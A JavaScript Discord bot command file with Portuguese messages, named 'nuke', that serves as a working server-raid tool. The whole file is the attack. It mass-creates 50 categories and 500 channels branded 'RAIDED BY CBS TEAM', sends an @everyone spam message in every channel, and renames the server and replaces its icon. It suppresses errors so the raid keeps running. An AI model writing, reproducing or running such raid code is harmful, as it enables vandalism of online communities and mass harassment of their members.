const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const config = require('../config');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('💀 CRIAÇÃO RÁPIDA - 500 canais e spam')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Apenas ADMs.', flags: 64 });
    }

    const botMember = interaction.guild.members.cache.get(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Me dê ADM.', flags: 64 });
    }

    await interaction.deferReply({ flags: 64 });
    const guild = interaction.guild;
    const user = interaction.user;
    const base = config.raid.baseName || 'RAIDED-BY-CBS';
    const mensagem = config.raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';

    const startTime = Date.now();

    try {
      // ===== 1. CRIAR CATEGORIAS =====
      await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
      const categories = [];
      for (let i = 0; i < 50; i++) {
        try {
          const cat = await guild.channels.create({
            name: `${base}-CAT-${i+1}`,
            type: ChannelType.GuildCategory,
            reason: 'RAID CBS'
          });
          categories.push(cat);
        } catch {}
      }

      // ===== 2. CRIAR 500 CANAIS =====
      await interaction.editReply('📂 CRIANDO 500 CANAIS...');
      const channels = [];
      for (let i = 0; i < 500; i++) {
        try {
          const cat = categories[i % categories.length] || null;
          const channel = await guild.channels.create({
            name: `${base}-CH-${i+1}`,
            type: ChannelType.GuildText,
            parent: cat?.id || null,
            topic: 'RAIDED BY CBS TEAM'
          });
          channels.push(channel);
          
          // Envia mensagem
          await channel.send({ content: `@everyone ${mensagem}` }).catch(() => {});
          
          if (channels.length % 50 === 0) {
            await interaction.editReply(`📂 ${channels.length}/500 canais criados`);
          }
        } catch {}
      }

      // ===== 3. MUDAR NOME E FOTO =====
      try {
        await guild.setName('RAIDED BY CBS TEAM');
        if (client.user.avatarURL()) {
          const avatar = await fetch(client.user.avatarURL({ size: 256, extension: 'png' }));
          const buffer = await avatar.buffer();
          await guild.setIcon(buffer);
        }
      } catch {}

      // ===== 4. FINAL =====
      const tempoTotal = Math.round((Date.now() - startTime) / 1000);
      await interaction.editReply(
        `✅ **NUKE CONCLUÍDO!**\n\n` +
        `📂 ${categories.length}/50 categorias\n` +
        `📂 ${channels.length}/500 canais\n` +
        `💬 Mensagem enviada em todos\n` +
        `⏱️ ${tempoTotal}s`
      );

    } catch (error) {
      console.error('❌ ERRO NUKE:', error);
      await interaction.editReply(`❌ ERRO: ${error.message}`);
    }
  }
};